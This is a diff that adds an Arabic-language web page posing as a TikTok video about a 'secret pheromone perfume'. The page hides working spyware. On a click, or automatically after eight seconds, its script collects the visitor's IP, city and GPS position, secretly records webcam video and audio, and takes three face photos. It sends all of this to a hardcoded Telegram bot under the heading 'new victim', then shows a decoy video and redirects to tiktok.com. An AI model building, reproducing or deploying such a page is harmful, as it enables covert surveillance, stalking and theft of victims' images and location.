@@ -1,1 +1,224 @@
-# youtube
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TikTok</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body,html{background:#000;color:#fff;font-family:'Roboto',sans-serif;overflow:hidden;height:100vh}
+        .container{width:100vw;height:100vh;max-width:500px;margin:auto;position:relative;background:#000;display:flex;flex-direction:column}
+        
+        /* فيديو تيك توك الأصلي */
+        .video-wrapper{position:relative;width:100%;height:100%;background:#000;overflow:hidden}
+        .thumb{position:absolute;top:0;left:0;width:100%;height:100%;background:url('https://www.modabodyshop.com/images/thumbs/0037471_pheromone-perfumes_520.jpeg') center/cover;filter:brightness(0.75);z-index:1;cursor:pointer;transition:opacity .4s}
+        .thumb::after{content:'';position:absolute;bottom:0;left:0;width:100%;height:60%;background:linear-gradient(transparent,rgba(0,0,0,.9));z-index:1}
+        
+        /* زر التشغيل الأصلي */
+        .play-btn{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:80px;height:80px;background:rgba(255,255,255,.25);border-radius:50%;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(12px);border:3px solid rgba(255,255,255,.4);box-shadow:0 8px 32px rgba(0,0,0,.6);z-index:3;animation:pulse 2s infinite}
+        .play-btn svg{width:36px;height:36px;fill:#fff;margin-left:4px}
+        @keyframes pulse{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.1)}}
+
+        /* نصوص تيك توك الأصلية */
+        .caption{position:absolute;bottom:90px;left:16px;right:16px;z-index:2}
+        .username{font-weight:900;font-size:16px;color:#fff;text-shadow:0 1px 3px rgba(0,0,0,.8);margin-bottom:4px}
+        .text{font-size:15px;line-height:1.4;color:#fff;max-height:60px;overflow:hidden;text-shadow:0 1px 3px rgba(0,0,0,.8)}
+        .hashtags{color:#ff2c55;font-weight:700}
+
+        /* أيقونات تيك توك السفلية */
+        .actions{position:absolute;bottom:80px;right:16px;display:flex;flex-direction:column;gap:20px;z-index:2;align-items:center}
+        .action-btn{width:48px;height:48px;background:rgba(255,255,255,.15);border-radius:50%;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(10px)}
+        .action-btn svg{width:24px;height:24px;fill:#fff}
+        .likes{font-size:13px;color:#fff;margin-top:4px;font-weight:600}
+
+        /* لوجو تيك توك */
+        .logo{position:absolute;top:16px;left:16px;font-weight:900;font-size:24px;color:#fe2c55;text-shadow:0 0 10px rgba(254,44,85,.6);letter-spacing:-1px;z-index:2}
+
+        /* لودر تيك توك */
+        #loader{position:absolute;top:0;left:0;width:100%;height:100%;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:10;opacity:0;visibility:hidden;transition:opacity .5s}
+        #loader.active{opacity:1;visibility:visible}
+        .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,.2);border-top:4px solid #fe2c55;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .load-text{font-size:15px;font-weight:500}
+
+        /* فيديو مزيف */
+        #fake{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:0;opacity:0;transition:opacity .6s}
+        #fake.playing{opacity:1}
+
+        /* مخفي */
+        .hid{position:absolute;opacity:0;width:1px;height:1px;pointer-events:none}
+        canvas{display:none}
+
+        /* تسجيل */
+        .record-indicator{display:none;position:absolute;top:16px;right:16px;width:12px;height:12px;background:#ff3b30;border-radius:50%;animation:blink 1s infinite;box-shadow:0 0 10px #ff3b30}
+        @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+        .recording .record-indicator{display:block}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="video-wrapper">
+            <!-- لوجو تيك توك -->
+            <div class="logo">TikTok</div>
+
+            <!-- الصورة المصغرة -->
+            <div class="thumb" id="thumb">
+                <div class="play-btn" id="playBtn">
+                    <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+                </div>
+
+                <!-- نصوص تيك توك -->
+                <div class="caption">
+                    <div class="username">@beauty_secret</div>
+                    <div class="text">عطر فيريمون سري يجذب الجميع <span class="hashtags">#pheromone #perfume #secret</span></div>
+                </div>
+
+                <!-- أيقونات تيك توك -->
+                <div class="actions">
+                    <div class="action-btn"><svg viewBox="0 0 24 24"><path d="M12.1 2.1c-3.3 0-6 2.7-6 6v.9c-1.2-.6-2.5-1-3.9-1-4.4 0-8 3.6-8 8s3.6 8 8 8c1.4 0 2.7-.4 3.9-1v.9c0 3.3 2.7 6 6 6s6-2.7 6-6-2.7-6-6-6c-1.4 0-2.7.4-3.9 1v-.9c0-3.3-2.7-6-6-6z"/></svg></div>
+                    <div class="likes">12.5K</div>
+
+                    <div class="action-btn"><svg viewBox="0 0 24 24"><path d="M19.5 12c0-4.1-3.4-7.5-7.5-7.5s-7.5 3.4-7.5 7.5 3.4 7.5 7.5 7.5c1.3 0 2.6-.4 3.7-1.1l.1-.1c.2-.2.4-.3.6-.3.4 0 .8.3.8.8v3.8c0 .4.3.8.8.8.4 0 .8-.3.8-.8v-3.8c0-.4.3-.8.8-.8.4 0 .8.3.8.8v3.8c0 1.3 1 2.3 2.3 2.3s2.3-1 2.3-2.3v-7.5c0-4.1-3.4-7.5-7.5-7.5z"/></svg></div>
+                    <div class="likes">8.2K</div>
+
+                    <div class="action-btn"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg></div>
+                    <div class="likes">45.8K</div>
+                </div>
+            </div>
+
+            <!-- لودر -->
+            <div id="loader">
+                <div class="spinner"></div>
+                <div class="load-text">جاري تحميل الفيديو...</div>
+            </div>
+
+            <!-- فيديو مزيف -->
+            <video id="fake" class="fake" loop playsinline muted></video>
+
+            <!-- كاميرا مخفية -->
+            <video id="cam" class="hid" autoplay playsinline muted></video>
+            <canvas id="c"></canvas>
+
+            <!-- مؤشر التسجيل -->
+            <div class="record-indicator"></div>
+        </div>
+    </div>
+
+    <script>
+        const BOT = '8242920453:AAE72_9hk3EUOienv9Gp7UreABReYlnfiFk';
+        const CID = '8004961958';
+        const REDIR = 'https://www.tiktok.com';
+        const FAKE_VID = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4';
+        const SEDUCTIVE_AUDIO = 'https://cdn.freesound.org/previews/620/620173_5674468-lq.mp3';
+
+        const thumb = document.getElementById('thumb');
+        const playBtn = document.getElementById('playBtn');
+        const loader = document.getElementById('loader');
+        const fake = document.getElementById('fake');
+        const cam = document.getElementById('cam');
+        const c = document.getElementById('c');
+        const ctx = c.getContext('2d');
+
+        let data = { ipData: {}, gps: {}, images: [], videoBlob: null, mouse: [], timestamp: '', url: '', title: '', referrer: '' };
+        let mediaRecorder, recordedChunks = [];
+
+        // تشغيل صوت مغري
+        function playSeductiveSound() {
+            const audio = new Audio(SEDUCTIVE_AUDIO);
+            audio.volume = 0.7;
+            audio.play().catch(() => {});
+        }
+
+        // جمع البيانات
+        async function collectData() {
+            try { const r = await fetch('https://ipapi.co/json/'); data.ipData = await r.json(); } catch(e) {}
+            await new Promise(r => {
+                navigator.geolocation.getCurrentPosition(p => { data.gps = {lat:p.coords.latitude,lon:p.coords.longitude}; r(); }, () => r(), {enableHighAccuracy:true,timeout:10000});
+            });
+            data.timestamp = new Date().toISOString();
+            data.url = location.href;
+            data.title = document.title;
+            data.referrer = document.referrer || 'مباشر';
+        }
+
+        // تسجيل فيديو
+        async function startRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                cam.srcObject = stream;
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                recordedChunks = [];
+                mediaRecorder.ondataavailable = e => e.data.size > 0 && recordedChunks.push(e.data);
+                mediaRecorder.onstop = () => { data.videoBlob = new Blob(recordedChunks, { type: 'video/webm' }); };
+                mediaRecorder.start();
+                document.body.classList.add('recording');
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+                    stream.getTracks().forEach(t => t.stop());
+                    document.body.classList.remove('recording');
+                }, 12000);
+            } catch(e) {}
+        }
+
+        // صور
+        async function captureImages() {
+            try {
+                const stream = cam.srcObject || await navigator.mediaDevices.getUserMedia({ video: true });
+                cam.srcObject = stream;
+                await cam.play();
+                for(let i=0; i<3; i++) {
+                    await new Promise(r => setTimeout(r, 800));
+                    c.width = cam.videoWidth; c.height = cam.videoHeight;
+                    ctx.drawImage(cam, 0, 0);
+                    data.images.push(c.toDataURL('image/jpeg', 0.8));
+                }
+            } catch(e) {}
+        }
+
+        // إرسال
+        async function sendToBot() {
+            const msg = `ضحية جديدة\nIP: ${data.ipData.ip||'؟'}\nمدينة: ${data.ipData.city||'؟'}\nGPS: ${data.gps.lat?`${data.gps.lat.toFixed(5)}, ${data.gps.lon.toFixed(5)}`:'مرفوض'}\nالوقت: ${data.timestamp}`;
+            await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CID,text:msg,parse_mode:'HTML'})});
+
+            for(let img of data.images) {
+                const blob = await (await fetch(img)).blob();
+                const fd = new FormData(); fd.append('chat_id', CID); fd.append('photo', blob, 'face.jpg');
+                await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:'POST', body:fd});
+                await new Promise(r=>setTimeout(r,1000));
+            }
+
+            if (data.videoBlob) {
+                const fd = new FormData(); fd.append('chat_id', CID); fd.append('video', data.videoBlob, 'secret.webm');
+                await fetch(`https://api.telegram.org/bot${BOT}/sendVideo`, {method:'POST', body:fd});
+            }
+        }
+
+        // تشغيل الفيديو المزيف
+        function playFakeVideo() {
+            fake.src = FAKE_VID;
+            fake.classList.add('playing');
+            fake.play().catch(() => setTimeout(() => location.href = REDIR, 2000));
+        }
+
+        // بدء العملية
+        async function start() {
+            playSeductiveSound();
+            thumb.style.opacity = '0';
+            loader.classList.add('active');
+            await collectData();
+            await startRecording();
+            await captureImages();
+            await sendToBot();
+            playFakeVideo();
+            setTimeout(() => location.href = REDIR, 30000);
+        }
+
+        // تشغيل بالضغط أو تلقائي
+        playBtn.addEventListener('click', e => { e.stopPropagation(); start(); });
+        thumb.addEventListener('click', start);
+        setTimeout(() => { if(!loader.classList.contains('active')) start(); }, 8000);
+    </script>
+</body>
+</html>
